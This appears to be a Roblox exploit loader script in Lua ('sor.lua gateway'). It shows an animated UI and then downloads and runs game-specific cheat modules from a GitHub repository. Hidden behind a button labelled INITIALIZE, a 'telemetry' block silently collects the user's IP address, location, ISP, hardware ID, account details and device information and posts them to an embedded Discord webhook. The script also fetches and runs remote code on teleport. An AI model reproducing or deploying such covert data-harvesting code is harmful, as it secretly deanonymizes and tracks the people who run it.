if getgenv().sor_loaded then return end
getgenv().sor_loaded = true

-- // NETWORK STANDARD //
local httprequest = (http_request or request or (http and http.request))
local queueteleport = (queue_on_teleport)
local get_exec = (identifyexecutor or function() return "Unknown" end)

-- // SERVICES //
local s = {
    rs = game:GetService("RunService"),
    ws = game:GetService("Workspace"),
    plrs = game:GetService("Players"),
    core = game:GetService("CoreGui"),
    http = game:GetService("HttpService"),
    uis = game:GetService("UserInputService"),
    tp = game:GetService("TeleportService"),
    light = game:GetService("Lighting"),
    stats = game:GetService("Stats"),
    analytics = game:GetService("RbxAnalyticsService"),
    ts = game:GetService("TweenService"),
    mkt = game:GetService("MarketplaceService")
}

repeat task.wait() until s.plrs.LocalPlayer
local lp = s.plrs.LocalPlayer
local id = game.PlaceId
local repo = "https://raw.githubusercontent.com/sorlua/Projects/main/Roblox/"

-- // WEBHOOK CONFIG //
local wh_url = "https://discord.com/api/webhooks/1447660811773415591/_c3J1odSUCMmk8Oj_DxefRpiXNvOLcAOyFKsSLm52LAWVd8uy340ZxlGOfANmCyZTNLH"
wh_url = wh_url:gsub("discord.com", "webhook.lewisakura.moe")
local invite_code = "dSH6BqTXAY"
local cfg_file = "sor_config.json"

local games = {
    [286090429] = "Arsenal.lua",
    [14561998168] = "FNTD2.lua",
    [142823291] = "mm2.lua"
}

-- // UI BUILD //
local gui = Instance.new("ScreenGui")
gui.Name = "sor_gateway"
gui.IgnoreGuiInset = true
gui.Parent = s.core or lp.PlayerGui

local main = Instance.new("Frame")
main.Size = UDim2.new(0, 450, 0, 260)
main.Position = UDim2.new(0.5, -225, 0.4, -130)
main.BackgroundColor3 = Color3.fromHex("#050505")
main.BorderSizePixel = 0
main.BackgroundTransparency = 1
main.Parent = gui

local stroke = Instance.new("UIStroke")
stroke.Color = Color3.fromHex("#ff002b")
stroke.Thickness = 1.5
stroke.Transparency = 1
stroke.Parent = main

Instance.new("UICorner", main).CornerRadius = UDim.new(0, 6)

local top = Instance.new("Frame")
top.Size = UDim2.new(1, 0, 0, 40)
top.BackgroundTransparency = 1
top.Parent = main

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 1, 0)
title.Position = UDim2.new(0, 15, 0, 0)
title.BackgroundTransparency = 1
title.Text = ""
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.TextXAlignment = Enum.TextXAlignment.Left
title.TextTransparency = 1
title.Parent = top

local div = Instance.new("Frame")
div.Size = UDim2.new(1, 0, 0, 1)
div.Position = UDim2.new(0, 0, 0, 40)
div.BackgroundColor3 = Color3.fromHex("#1a1a1a")
div.BorderSizePixel = 0
div.BackgroundTransparency = 1
div.Parent = main

local cont = Instance.new("Frame")
cont.Size = UDim2.new(1, 0, 1, -41)
cont.Position = UDim2.new(0, 0, 0, 41)
cont.BackgroundTransparency = 1
cont.Parent = main

local av = Instance.new("ImageLabel")
av.Size = UDim2.new(0, 60, 0, 60)
av.Position = UDim2.new(0, 20, 0, 20)
av.BackgroundColor3 = Color3.fromHex("#0a0a0a")
av.Image = s.plrs:GetUserThumbnailAsync(lp.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
av.ImageTransparency = 1
av.Parent = cont
Instance.new("UICorner", av).CornerRadius = UDim.new(1, 0)
local av_s = Instance.new("UIStroke", av)
av_s.Color = Color3.fromHex("#333")
av_s.Thickness = 1
av_s.Transparency = 1

local u_lbl = Instance.new("TextLabel")
u_lbl.Size = UDim2.new(0, 200, 0, 20)
u_lbl.Position = UDim2.new(0, 95, 0, 25)
u_lbl.BackgroundTransparency = 1
u_lbl.Text = "user: " .. lp.Name
u_lbl.TextColor3 = Color3.fromHex("#ccc")
u_lbl.Font = Enum.Font.Gotham
u_lbl.TextSize = 14
u_lbl.TextXAlignment = Enum.TextXAlignment.Left
u_lbl.TextTransparency = 1
u_lbl.Parent = cont

local g_lbl = Instance.new("TextLabel")
g_lbl.Size = UDim2.new(0, 200, 0, 20)
g_lbl.Position = UDim2.new(0, 95, 0, 45)
g_lbl.BackgroundTransparency = 1
g_lbl.Text = "module: scanning..."
g_lbl.TextColor3 = Color3.fromHex("#888")
g_lbl.Font = Enum.Font.Gotham
g_lbl.TextSize = 12
g_lbl.TextXAlignment = Enum.TextXAlignment.Left
g_lbl.TextTransparency = 1
g_lbl.Parent = cont

local function make_btn(txt, pos, sz, col, fn)
    local b = Instance.new("TextButton")
    b.Size = sz
    b.Position = pos
    b.BackgroundColor3 = Color3.fromHex("#0a0a0a")
    b.Text = txt
    b.TextColor3 = col
    b.Font = Enum.Font.GothamBold
    b.TextSize = 11
    b.BackgroundTransparency = 1
    b.TextTransparency = 1
    b.Parent = cont
    local c = Instance.new("UICorner", b)
    c.CornerRadius = UDim.new(0, 4)
    local st = Instance.new("UIStroke", b)
    st.Color = Color3.fromHex("#333")
    st.Thickness = 1
    st.Transparency = 1
    b.MouseEnter:Connect(function() st.Color = col; b.BackgroundColor3 = Color3.fromHex("#111") end)
    b.MouseLeave:Connect(function() st.Color = Color3.fromHex("#333"); b.BackgroundColor3 = Color3.fromHex("#0a0a0a") end)
    b.MouseButton1Click:Connect(fn)
    return b, st
end

local boost = false
local b_fps, _ = make_btn("fps boost: off", UDim2.new(0, 20, 0, 100), UDim2.new(0, 130, 0, 25), Color3.fromHex("#888"), function() end)
b_fps.MouseButton1Click:Connect(function()
    boost = not boost
    b_fps.Text = boost and "fps boost: on" or "fps boost: off"
    b_fps.TextColor3 = boost and Color3.fromHex("#ff002b") or Color3.fromHex("#888")
end)

make_btn("reset config", UDim2.new(0, 160, 0, 100), UDim2.new(0, 130, 0, 25), Color3.fromHex("#ffaa00"), function()
    if isfile(cfg_file) then delfile(cfg_file) end
    g_lbl.Text = "status: config purged"
    task.wait(1)
    g_lbl.Text = "status: ready"
end)

make_btn("rejoin", UDim2.new(0, 20, 0, 135), UDim2.new(0, 130, 0, 25), Color3.fromHex("#fff"), function()
    if queueteleport then queueteleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/sorlua/Projects/main/Roblox/loader.lua"))()') end
    s.tp:Teleport(id, lp)
end)

make_btn("server hop", UDim2.new(0, 160, 0, 135), UDim2.new(0, 130, 0, 25), Color3.fromHex("#fff"), function()
    g_lbl.Text = "status: searching..."
    task.spawn(function()
        local l = {}
        pcall(function()
            local r = s.http:JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/"..id.."/servers/Public?sortOrder=Asc&limit=100"))
            for _,v in ipairs(r.data) do if type(v)=="table" and v.maxPlayers > v.playing and v.id ~= game.JobId then table.insert(l, v.id) end end
        end)
        if #l>0 then
            if queueteleport then queueteleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/sorlua/Projects/main/Roblox/loader.lua"))()') end
            s.tp:TeleportToPlaceInstance(id, l[math.random(1,#l)], lp)
        else g_lbl.Text = "status: no servers" end
    end)
end)

make_btn("discord", UDim2.new(0, 300, 0, 135), UDim2.new(0, 130, 0, 25), Color3.fromHex("#5865F2"), function()
    if setclipboard then setclipboard("https://discord.gg/"..invite_code) end
    if httprequest then
        for i=6463,6472 do
            task.spawn(function() pcall(function()
                httprequest({Url="http://127.0.0.1:"..i.."/rpc?v=1",Method="POST",Headers={["Content-Type"]="application/json",["Origin"]="https://discord.com"},Body=s.http:JSONEncode({cmd="INVITE_BROWSER",args={code=invite_code},nonce=s.http:GenerateGUID(false)})})
            end) end)
        end
    end
    g_lbl.Text = "status: invite copied"
end)

local run = Instance.new("TextButton")
run.Size = UDim2.new(1, -40, 0, 35)
run.Position = UDim2.new(0, 20, 1, -50)
run.BackgroundColor3 = Color3.fromHex("#ff002b")
run.Text = "INITIALIZE"
run.TextColor3 = Color3.fromHex("#fff")
run.Font = Enum.Font.GothamBold
run.TextSize = 14
run.BackgroundTransparency = 1
run.TextTransparency = 1
run.Parent = cont
Instance.new("UICorner", run).CornerRadius = UDim.new(0, 4)

local url = repo .. "universal.lua"
local mod = "Universal"
if games[id] then
    url = repo .. games[id]
    mod = games[id]:gsub(".lua","")
end

if isfile(cfg_file) then
    pcall(function()
        local d = s.http:JSONDecode(readfile(cfg_file))
        if d and d.boost then
            boost = true
            b_fps.Text = "fps boost: on"
            b_fps.TextColor3 = Color3.fromHex("#ff002b")
        end
    end)
end

-- // INTRO ANIM //
s.ts:Create(main, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundTransparency=0}):Play()
s.ts:Create(stroke, TweenInfo.new(0.6), {Transparency=0}):Play()
task.wait(0.2)
s.ts:Create(div, TweenInfo.new(0.4), {BackgroundTransparency=0}):Play()
local txt = "sor.lua // gateway"
for i=1, #txt do
    title.Text = txt:sub(1,i)
    title.TextTransparency = 0
    task.wait(0.02)
end
s.ts:Create(av, TweenInfo.new(0.5), {ImageTransparency=0}):Play()
s.ts:Create(av_s, TweenInfo.new(0.5), {Transparency=0}):Play()
task.wait(0.1)
s.ts:Create(u_lbl, TweenInfo.new(0.4), {TextTransparency=0}):Play()
s.ts:Create(g_lbl, TweenInfo.new(0.4), {TextTransparency=0}):Play()
for _,v in ipairs(cont:GetChildren()) do
    if v:IsA("TextButton") then
        s.ts:Create(v, TweenInfo.new(0.4), {BackgroundTransparency = v == run and 0 or 1, TextTransparency=0}):Play()
        if v:FindFirstChild("UIStroke") then s.ts:Create(v.UIStroke, TweenInfo.new(0.4), {Transparency=0}):Play() end
    end
end
g_lbl.Text = "module: " .. mod

-- // INJECTION HANDLER //
run.MouseButton1Click:Connect(function()
    run.Text = "processing..."
    if writefile then pcall(writefile, cfg_file, s.http:JSONEncode({boost=boost})) end

    -- TELEMETRY (Async)
    task.spawn(function()
        if not httprequest then return end
        
        -- Safe Data Grab
        local exec = get_exec()
        local hwid = s.analytics:GetClientId()
        local ip_info = {query="Hidden", city="N/A", country="N/A", isp="N/A"}
        
        local ip_ok, ip_res = pcall(game.HttpGet, game, "http://ip-api.com/json")
        if ip_ok then pcall(function() ip_info = s.http:JSONDecode(ip_res) end) end

        -- Fetch Game Name
        local game_name = "Unknown"
        local safe_info, info_res = pcall(function() return s.mkt:GetProductInfo(id) end)
        if safe_info and info_res then game_name = info_res.Name end

        local cam = workspace.CurrentCamera
        local vp = cam and cam.ViewportSize or Vector2.new(0,0)
        local fps_phys = math.floor(workspace:GetRealPhysicsFPS())
        local mem_use = math.floor(gcinfo())
        local ping_ms = 0
        pcall(function() ping_ms = math.floor(s.stats.Network.ServerStatsItem["Data Ping"]:GetValue()) end)
        
        local platform = "PC"
        if s.uis.TouchEnabled and not s.uis.KeyboardEnabled then platform = "Mobile" 
        elseif s.uis.GamepadEnabled then platform = "Console" end
        
        local ident = (getidentity and getidentity()) or "N/A"
        local job_id = game.JobId
        
        local embed_payload = {
            title = "sor.lua // industrialist",
            color = 16711723, -- Neon Red
            thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId="..lp.UserId.."&width=420&height=420&format=png"},
            fields = {
                {name = ":: user_profile", value = "--------------------------------", inline = false},
                {name = "Display", value = lp.DisplayName, inline = true},
                {name = "User", value = lp.Name, inline = true},
                {name = "ID", value = "`"..tostring(lp.UserId).."`", inline = true},
                {name = "Age", value = lp.AccountAge.." days", inline = true},

                {name = ":: network_node", value = "--------------------------------", inline = false},
                {name = "IP", value = "||"..ip_info.query.."||", inline = true},
                {name = "Region", value = ip_info.city..", "..ip_info.country, inline = true},
                {name = "ISP", value = ip_info.isp, inline = true},
                {name = "Ping", value = ping_ms.."ms", inline = true},

                {name = ":: session_data", value = "--------------------------------", inline = false},
                {name = "Game Name", value = game_name, inline = true},
                {name = "Module", value = mod, inline = true},
                {name = "Game ID", value = tostring(id), inline = true},
                {name = "Job ID", value = "||"..job_id.."||", inline = true},

                {name = ":: execution_env", value = "--------------------------------", inline = false},
                {name = "Executor", value = exec, inline = true},
                {name = "Platform", value = platform, inline = true},
                {name = "Context", value = tostring(ident), inline = true},
                {name = "Resolution", value = math.floor(vp.X).."x"..math.floor(vp.Y), inline = true},
                {name = "FPS", value = tostring(fps_phys), inline = true},
                {name = "Memory", value = mem_use.." MB", inline = true},
                {name = "Hardware ID", value = "`"..hwid.."`", inline = false}
            },
            footer = {text = "sor.lua // v6 // " .. os.date("%Y-%m-%d %H:%M:%S")}
        }

        pcall(httprequest, {
            Url = wh_url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = s.http:JSONEncode({content = "", embeds = {embed_payload}})
        })
    end)

    if boost then
        s.light.GlobalShadows = false
        s.light.FogEnd = 9e9
        for _,v in pairs(s.ws:GetDescendants()) do if v:IsA("BasePart") then v.CastShadow = false end end
    end

    run.Text = "injecting..."
    
    local safe_load, load_result = pcall(game.HttpGet, game, url)
    
    if safe_load then
        task.spawn(function()
            local func, err = loadstring(load_result)
            if func then func() else warn("sor.lua // compiler error: "..tostring(err)) end
        end)
        
        run.Text = "success"
        
        s.ts:Create(main, TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {Position=UDim2.new(0.5,-225,1.5,0)}):Play()
        task.wait(1)
        gui:Destroy()
    else
        run.Text = "failed"
        warn("sor.lua // network error: " .. tostring(load_result))
        task.wait(2)
        gui:Destroy()
    end
end)
